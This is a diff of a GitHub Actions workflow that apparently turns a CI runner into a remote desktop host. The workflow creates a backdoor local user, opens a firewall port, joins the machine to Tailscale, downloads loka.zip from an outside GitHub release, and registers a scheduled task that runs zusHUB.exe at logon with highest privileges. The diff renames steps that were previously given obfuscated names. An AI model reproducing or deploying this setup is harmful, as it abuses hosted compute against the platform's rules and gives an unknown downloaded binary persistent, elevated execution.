@@ -1,4 +1,4 @@
-name: ERFHTSS
+name: ENV-SET-SESS
 
 on:
   workflow_dispatch:
@@ -9,7 +9,7 @@ jobs:
     timeout-minutes: 3600
 
     steps:
-      - name: EnableTHH
+      - name: Enable sok + Firewall Port
         shell: pwsh
         run: |
           $g = Get-Random -Minimum 30000 -Maximum 60000
@@ -22,7 +22,7 @@ jobs:
 
           "PRT=$g" | Out-File -FilePath $env:GITHUB_ENV -Append
 
-      - name: Cre5YR
+      - name: Create Local User
         shell: pwsh
         run: |
           $nm = "svc" + (Get-Random -Minimum 1000 -Maximum 9000)
@@ -36,7 +36,7 @@ jobs:
           "USR=$nm" | Out-File $env:GITHUB_ENV -Append
           "PWD=$pw" | Out-File $env:GITHUB_ENV -Append
 
-      - name: InstRGRGilsR
+      - name: Install Tailscale
         shell: pwsh
         run: |
           $u = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
@@ -44,7 +44,7 @@ jobs:
           Invoke-WebRequest $u -OutFile $f
           Start-Process msiexec -ArgumentList "/i `"$f`" /quiet /norestart" -Wait
 
-      - name: ConneRGR
+      - name: Connect Tailscale
         shell: pwsh
         run: |
           $ts = "$env:ProgramFiles\Tailscale\tailscale.exe"
@@ -61,33 +61,22 @@ jobs:
           "TSIP=$ip" | Out-File $env:GITHUB_ENV -Append
 
       # 🔥 تحميل Loka.zip
-      - name: Downloa54RYp)
+      - name: Download RDP File (loka.zip)
         shell: pwsh
         run: |
           New-Item -ItemType Directory -Path "C:\RDP-FILE" -Force | Out-Null
           Invoke-WebRequest -Uri "https://github.com/tyjuoi78uk/FERT/releases/download/v1/loka.zip" -OutFile "C:\RDP-FILE\loka.zip"
           Expand-Archive "C:\RDP-FILE\loka.zip" -DestinationPath "C:\RDP-FILE" -Force
 
-      # ⭐ تشغيل zusHUB.exe تلقائيًا مع أول تسجيل دخول RDP
-      - name: EnabRTxe
+      # ⭐ تشغيل zusHUB.exe عند تسجيل الدخول الحقيقي للـ RDP
+      - name: Auto run tool on RDP Login (REAL FIX)
         shell: pwsh
         run: |
           $usr = "${{ env.USR }}"
-          $userStartup = "C:\Users\$usr\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-          New-Item -ItemType Directory -Force -Path $userStartup | Out-Null
-
           $exePath = "C:\RDP-FILE\loka\zusHUB.exe"
-          $shortcut = "$userStartup\zusHUB.lnk"
+          $taskName = "Run_zusHUB_on_RDP_Login"
 
-          $ws = New-Object -ComObject WScript.Shell
-          $sc = $ws.CreateShortcut($shortcut)
-          $sc.TargetPath = $exePath
-          $sc.WorkingDirectory = "C:\RDP-FILE\loka"
-          $sc.Save()
+          $action = New-ScheduledTaskAction -Execute $exePath
+          $trigger = New-ScheduledTaskTrigger -AtLogOn -User $usr
 
-      - name: Idle
-        shell: pwsh
-        run: |
-          while($true){
-            Start-Sleep -Seconds (Get-Random -Minimum 140 -Maximum 300)
-          }
+          Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User $usr -RunLevel Highest -Force
